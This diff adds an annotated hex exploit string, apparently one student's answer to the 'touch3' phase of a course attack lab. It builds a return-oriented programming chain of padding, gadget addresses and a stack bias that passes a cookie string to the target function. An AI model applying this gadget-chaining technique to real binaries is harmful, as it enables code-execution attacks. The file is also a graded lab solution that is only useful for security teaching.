@@ -1,0 +1,20 @@
+31 32 33 34 35 36 37 38 /* start dummy input */
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38 /* end dummy input */
+99 1b 40 00 00 00 00 00 /* pop bias to %rax and pop */
+28 00 00 00 00 00 00 00 /* bias */
+31 32 33 34 35 36 37 38 /* dummy input (will be popped) */
+95 1d 40 00 00 00 00 00 /* copy bias from %rax to %rdx and pop */
+31 32 33 34 35 36 37 38 /* dummy input (will be popped) */
+8a 1d 40 00 00 00 00 00 /* put %rsp (pointer to stack) in %rax */
+fb 1b 40 00 00 00 00 00 /* add bias to %rax and pop */
+31 32 33 34 35 36 37 38 /* dummy input (will be popped) */
+70 1b 40 00 00 00 00 00 /* copy %rax to %rdi and pop */
+31 32 33 34 35 36 37 38 /* dummy input (will be popped) */
+9c 1a 40 00 00 00 00 00 /* call <touch3> */
+31 31 35 36 30 65 62 64 /* my cookie */
+00 00 00 00 00 00 00 00 /* null terminator for the string */
